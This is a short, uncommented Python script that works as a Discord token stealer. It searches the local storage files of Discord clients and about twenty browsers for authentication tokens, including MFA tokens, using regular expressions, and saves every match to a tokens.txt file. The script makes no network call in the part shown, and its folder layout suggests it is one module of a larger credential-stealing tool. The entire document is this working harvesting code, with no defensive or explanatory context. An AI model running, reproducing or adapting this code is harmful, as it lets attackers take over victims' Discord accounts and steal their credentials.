import os,re
b=os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
f=os.path.join(b,"info","tokens")
os.makedirs(f,exist_ok=True)
tokens=[]
local,roaming=os.getenv('LOCALAPPDATA'),os.getenv('APPDATA')
paths={'Discord':os.path.join(roaming,'discord'),'Discord Canary':os.path.join(roaming,'discordcanary'),'Lightcord':os.path.join(roaming,'Lightcord'),'Discord PTB':os.path.join(roaming,'discordptb'),'Opera':os.path.join(roaming,'Opera Software','Opera Stable'),'Opera GX':os.path.join(roaming,'Opera Software','Opera GX Stable'),'Amigo':os.path.join(local,'Amigo','User Data'),'Torch':os.path.join(local,'Torch','User Data'),'Kometa':os.path.join(local,'Kometa','User Data'),'Orbitum':os.path.join(local,'Orbitum','User Data'),'CentBrowser':os.path.join(local,'CentBrowser','User Data'),'7Star':os.path.join(local,'7Star','7Star','User Data'),'Sputnik':os.path.join(local,'Sputnik','Sputnik','User Data'),'Vivaldi':os.path.join(local,'Vivaldi','User Data','Default'),'Chrome SxS':os.path.join(local,'Google','Chrome SxS','User Data'),'Chrome':os.path.join(local,'Google','Chrome','User Data','Default'),'Epic Privacy Browser':os.path.join(local,'Epic Privacy Browser','User Data'),'Microsoft Edge':os.path.join(local,'Microsoft','Edge','User Data','Default'),'Uran':os.path.join(local,'uCozMedia','Uran','User Data'),'Yandex':os.path.join(local,'Yandex','YandexBrowser','User Data','Default')}
for path in paths.values():
 ld=os.path.join(path,"Local Storage","leveldb")
 if not os.path.exists(ld): continue
 for file in os.listdir(ld):
  if not file.endswith(('.log','.ldb')): continue
  try:
   with open(os.path.join(ld,file),errors='ignore') as x: c=x.read()
   for t in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}",c):
    if t not in tokens: tokens.append(t)
  except: continue
with open(os.path.join(f,"tokens.txt"),'w') as x: x.write('\n'.join(tokens))
